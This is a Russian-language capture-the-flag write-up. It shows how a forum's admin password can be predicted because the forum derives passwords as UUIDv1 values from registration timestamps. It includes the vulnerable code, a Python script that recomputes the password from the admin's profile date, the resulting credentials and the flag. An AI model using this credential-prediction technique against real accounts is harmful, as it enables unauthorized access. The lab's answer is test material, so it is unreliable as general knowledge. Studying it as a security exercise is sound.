## Описание

Вы умеете предсказывать будущее? А узнавать чьё-то прошлое? Нет? Что ж, в любом случае нам пришёл новый заказ: оценить безопасность одного форума. Это по Вашей части и вряд ли в этом случае Вам нужно обладать экстрасенсорными навыками, потому что в IT-сфере магии не бывает.

## Решение

Видим в коде, что генерация пароля зависит от даты регистрации пользователя:

```
def generate_uuid(timestamp_str):
    try:
        timestamp = datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S.%f")
        uuid_epoch = datetime(1582, 10, 15)
        intervals = int((timestamp - uuid_epoch).total_seconds() * 1e7)
        clock_seq = 0x89ca
        node = 0x000c297433a0
        uuid1 = uuid.UUID(fields=(intervals & 0xFFFFFFFF,
                                  (intervals >> 32) & 0xFFFF,
                                  ((intervals >> 48) & 0x0FFF) | (1 << 12),
                                  clock_seq >> 8,
                                  clock_seq & 0xFF,
                                  node))
        return str(uuid1)
    except ValueError as e:
        print(f"Ошибка: {e}")
        return "Ошибка: время (timestamp)."

timestamp = exact_time.strftime("%Y-%m-%d %H:%M:%S.%f")
password = generate_uuid(timestamp)
```

Получаем дату регистрации админа:

http://62.173.140.174:16065/profile/1

Генерируем пароль через generate_uuid с этой датой регистрации:

```
import datetime
import uuid


def generate_uuid(timestamp_str):
    try:
        timestamp = datetime.datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S.%f")
        uuid_epoch = datetime.datetime(1582, 10, 15)
        intervals = int((timestamp - uuid_epoch).total_seconds() * 1e7)
        clock_seq = 0x89ca
        node = 0x000c297433a0
        uuid1 = uuid.UUID(fields=(intervals & 0xFFFFFFFF,
                                  (intervals >> 32) & 0xFFFF,
                                  ((intervals >> 48) & 0x0FFF) | (1 << 12),
                                  clock_seq >> 8,
                                  clock_seq & 0xFF,
                                  node))
        return str(uuid1)
    except ValueError as e:
        print(f"Ошибка: {e}")
        return "Ошибка: время (timestamp)."

password = generate_uuid("2025-01-22 00:42:26.053996")
print(password)
```

Логинимся: http://62.173.140.174:16065/login

username = admin  
password = c03ac230-d859-11ef-89ca-000c297433a0

CODEBY{d1d_u_pr3dict_th1s_your53lf?}
